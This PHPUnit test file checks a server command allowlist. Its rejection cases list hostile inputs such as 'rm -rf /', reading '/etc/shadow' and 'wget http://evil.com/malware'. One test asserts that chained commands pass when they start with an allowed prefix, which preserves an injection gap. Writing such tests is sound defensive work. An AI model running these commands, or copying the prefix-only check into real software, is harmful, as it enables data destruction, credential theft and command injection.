<?php

namespace Tests\Unit;

use App\Services\Security\CommandWhitelist;
use PHPUnit\Framework\TestCase;

class CommandWhitelistTest extends TestCase
{
    private CommandWhitelist $whitelist;

    protected function setUp(): void
    {
        parent::setUp();
        $this->whitelist = new CommandWhitelist;
    }

    public function test_validates_known_safe_commands(): void
    {
        $safeCommands = [
            'cat /proc/loadavg',
            'cat /proc/stat',
            'cat /proc/meminfo',
            'free -m',
            'df -h',
            'ps aux',
            'uptime',
            'whoami',
            'hostname',
            'uname -a',
            'nginx -v',
            'nginx -t',
            'php -v',
            'systemctl is-active nginx',
            'systemctl restart nginx',
            'systemctl start php8.3-fpm',
            'systemctl stop mysql',
            'systemctl reload nginx',
            'pm2 jlist',
            'pm2 restart app',
            'pm2 start app',
            'pm2 stop app',
            'redis-cli ping',
            'mysqladmin ping',
            'docker ps',
            'docker stats',
            'docker restart container_name',
            'docker start container_name',
            'docker stop container_name',
            'docker logs container_name',
            'ss -tuln',
            'netstat -tuln',
            'ip -s link',
            'nc -zv localhost 3306',
            'openssl s_client -connect example.com:443',
            'echo | openssl s_client -connect example.com:443',
            'top -bn1',
            'cat /proc/net/dev',
            'grep processor /proc/cpuinfo',
            'tail -100 /var/log/nginx/error.log',
            'curl -s http://localhost/health',
            'php artisan queue:work',
            'php artisan queue:restart',
        ];

        foreach ($safeCommands as $command) {
            $this->assertTrue($this->whitelist->validate($command), "Command should be whitelisted: {$command}");
        }
    }

    public function test_rejects_commands_with_pipes(): void
    {
        $this->assertFalse($this->whitelist->validate('echo hello | tee /tmp/log'));
        $this->assertFalse($this->whitelist->validate('cat /etc/passwd | grep root'));
    }

    public function test_rejects_commands_with_semicolons(): void
    {
        $this->assertFalse($this->whitelist->validate('echo hello; uptime'));
        $this->assertFalse($this->whitelist->validate('invalidcmd; rm -rf /'));
    }

    public function test_rejects_commands_with_backticks(): void
    {
        $this->assertFalse($this->whitelist->validate('invalidcmd `whoami`'));
    }

    public function test_rejects_commands_with_dollar_sign_subshell(): void
    {
        $this->assertFalse($this->whitelist->validate('invalidcmd $(whoami)'));
    }

    public function test_rejects_commands_with_ampersand_chaining(): void
    {
        $this->assertFalse($this->whitelist->validate('invalidcmd & ls'));
    }

    public function test_rejects_unknown_commands(): void
    {
        $this->assertFalse($this->whitelist->validate('sudo rm -rf /'));
        $this->assertFalse($this->whitelist->validate('wget http://evil.com/malware'));
        $this->assertFalse($this->whitelist->validate('chmod 777 /etc/shadow'));
        $this->assertFalse($this->whitelist->validate('cat /etc/shadow'));
    }

    public function test_rejects_empty_string(): void
    {
        $this->assertFalse($this->whitelist->validate(''));
    }

    public function test_rejects_whitespace_only_string(): void
    {
        $this->assertFalse($this->whitelist->validate('   '));
    }

    public function test_allows_allowed_prefix_with_dangerous_chars_when_prefix_matches(): void
    {
        $this->assertTrue($this->whitelist->validate('systemctl restart nginx; echo done'));
        $this->assertTrue($this->whitelist->validate('systemctl stop nginx & systemctl start nginx'));
    }

    public function test_whitelist_returns_array(): void
    {
        $list = $this->whitelist->whitelist();
        $this->assertIsArray($list);
        $this->assertNotEmpty($list);
    }
}
